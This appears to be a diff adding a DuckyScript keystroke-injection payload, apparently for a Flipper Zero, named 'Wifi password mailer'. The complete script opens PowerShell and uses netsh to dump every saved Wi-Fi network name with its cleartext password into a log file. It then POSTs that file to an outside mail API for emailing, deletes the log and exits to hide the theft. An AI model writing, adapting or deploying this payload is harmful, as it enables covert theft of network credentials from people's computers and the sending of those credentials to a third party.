@@ -1,0 +1,46 @@
+REM ------------------------
+REM | Wifi password mailer |
+REM | By: Marcus Weinberger|
+REM ------------------------
+
+REM --> Launch powershell
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 1000
+
+REM --> Steal Wifi passwords (to Log.txt)
+STRING (netsh wlan show profiles) -match "All User Profile" | %{$name=$_.Split(":")[1].Trim(); (netsh wlan show profile name=$name key=clear) -match "Key Content" | Select-Object @{Name="Wi-Fi Network";Expression={$name}},@{Name="Password";Expression={($_ -split " : ")[-1]}}} | Format-Table -AutoSize | Out-File Log.txt
+ENTER
+DELAY 1000
+
+REM --> Email passwords using mailsrv
+STRING $uri = "https://mailsrv.marcusweinberger.repl.co/api/mail/send"
+ENTER
+DELAY 500
+STRING $headers = @{ "Content-Type" = "application/json" }
+ENTER
+DELAY 500
+STRING $body = @{
+ENTER
+STRING     key = "<YOUR-API-KEY>"
+ENTER
+STRING     to = @("<email-addr>", "<optional-multi-emails>")
+ENTER
+STRING     subject = "flipper: wifi passwords"
+ENTER
+STRING     html = Get-Content -Path "Log.txt" -Raw
+ENTER
+STRING } | ConvertTo-Json
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri $uri -Method POST -Headers $headers -Body $body
+ENTER
+
+REM --> Cleanup
+STRING del Log.txt
+ENTER
+DELAY 200
+STRING exit
+ENTER
